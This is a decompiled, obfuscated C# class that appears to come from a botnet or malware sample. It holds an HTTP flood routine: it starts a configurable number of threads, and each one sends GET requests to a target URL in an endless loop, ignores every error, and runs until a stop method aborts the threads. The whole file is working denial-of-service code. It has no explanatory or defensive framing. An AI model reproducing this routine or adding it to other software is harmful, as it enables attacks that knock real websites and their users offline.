using System.Net;
using System.Threading;

internal class Class15
{
	private class Class16
	{
		private string string_0;

		private WebClient webClient_0;

		public Class16(string string_1)
		{
			Class51.smethod_0();
			webClient_0 = new WebClient();
			base._002Ector();
			string_0 = string_1;
		}

		public void method_0()
		{
			while (true)
			{
				try
				{
					while (true)
					{
						webClient_0.DownloadString(string_0);
					}
				}
				catch
				{
				}
			}
		}
	}

	private static ThreadStart[] threadStart_0;

	private static Thread[] thread_0;

	public static string string_0;

	private static Class16[] class16_0;

	public static int int_0;

	public static void smethod_0()
	{
		thread_0 = new Thread[int_0];
		threadStart_0 = new ThreadStart[int_0];
		class16_0 = new Class16[int_0];
		if (!string_0.StartsWith("http://"))
		{
			string_0 = "http://" + string_0;
		}
		for (int i = 0; i < int_0; i++)
		{
			class16_0[i] = new Class16(string_0);
			threadStart_0[i] = class16_0[i].method_0;
			thread_0[i] = new Thread(threadStart_0[i]);
			thread_0[i].Start();
		}
	}

	public static void smethod_1()
	{
		for (int i = 0; i < int_0; i++)
		{
			try
			{
				thread_0[i].Abort();
				thread_0[i].Join();
			}
			catch
			{
			}
		}
	}

	public Class15()
	{
		Class51.smethod_0();
		base._002Ector();
	}
}
